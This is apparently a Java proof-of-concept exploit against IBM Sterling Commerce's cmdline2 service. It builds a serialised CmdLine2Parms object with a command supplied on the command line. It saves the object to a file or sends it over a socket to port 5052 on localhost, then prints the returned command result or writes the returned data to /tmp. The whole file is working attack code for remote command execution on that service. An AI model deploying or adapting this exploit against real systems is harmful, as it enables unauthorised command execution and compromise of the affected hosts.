package com.sterlingcommerce.woodstock.services.cmdline2;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;

public class Main {
    public static void main(String[] args) throws Exception {
        if(args.length != 2) {
            System.err.println("Usage: Main <cmdLine> <outfile_or_SEND>");
            System.exit(9);
        } else {
            System.out.println("[+] Creating object...");
        }

        CmdLine2Parms cmdLine2Parms = new CmdLine2Parms();
        cmdLine2Parms.cmdLine = args[0];
        cmdLine2Parms.workingDir = "/tmp/";
        cmdLine2Parms.useOutput = false;
        cmdLine2Parms.debug = true;
        cmdLine2Parms.wait = true;
        cmdLine2Parms.useInput = false;

        boolean savetoFile = !args[1].equals("SEND");
        if(savetoFile){
            String filename = args[1];
            FileOutputStream fileOutputStream = new FileOutputStream(filename);
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);

            objectOutputStream.writeObject(cmdLine2Parms);
            objectOutputStream.flush();
            objectOutputStream.close();
            System.out.println("[+] Saved object to "+filename);
        }else{
            System.out.println("[+] Sending object...");
            Socket s = new Socket("127.0.0.1",5052);
            ObjectOutputStream oos = new ObjectOutputStream(new BufferedOutputStream(s.getOutputStream()));
            oos.writeObject(cmdLine2Parms);
            oos.flush();
            System.out.println("[+] ...Sent!");

            System.out.println("[+] Receiving header...");
            BufferedInputStream bis = new BufferedInputStream(s.getInputStream());
            ObjectInputStream ois = new ObjectInputStream(bis);
            String header = (String) ois.readObject();
            System.out.println("[+] ...header received:");
            System.out.println(header);

            if(header.equals("RESULT")){
                System.out.println("[+] Receiving result...");
                CmdLine2Result res = (CmdLine2Result) ois.readObject();
                System.out.println("[+] Result received:");
                System.out.printf(res.toString());
            } else if (header.equals("READY")) {
                System.out.println("[+] Receiving buffer...");
                BufferedOutputStream fbos = null;
                long totalBytes = 0;
                int bytesRead;
                int bufferSize = s.getReceiveBufferSize();
                byte[] buffer = new byte[bufferSize];
                fbos = new BufferedOutputStream(new FileOutputStream("/tmp/withsecuredisk"), bufferSize);
                while (totalBytes < cmdLine2Parms.fileSize && (bytesRead = ois.read(buffer)) != -1) {
                    totalBytes += bytesRead;
                    fbos.write(buffer, 0, bytesRead);
                }
                if (totalBytes != cmdLine2Parms.fileSize) {
                    StringBuffer sb = new StringBuffer(100);
                    sb.append("[!] Byte counts do not match. Total bytes read=");
                    sb.append(totalBytes);
                    sb.append(" does not equal file size=");
                    sb.append(cmdLine2Parms.fileSize);
                    String msg = sb.toString();
                    throw new IOException(msg);
                }
                fbos.close();
            }

        }

    }
}